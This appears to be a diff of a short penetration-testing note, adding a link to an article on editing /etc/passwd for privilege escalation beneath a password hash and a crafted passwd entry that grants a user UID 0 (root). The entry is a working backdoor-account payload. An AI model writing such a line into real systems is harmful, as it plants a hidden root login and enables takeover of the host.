@@ -4,3 +4,6 @@
 `$1$an4kein$KpVTAUsL0SO0N532qSXyf.`
 
 `an4kein:$1$an4kein$KpVTAUsL0SO0N532qSXyf.:0:0:/root/root:/bin/bash`
+
+
+https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
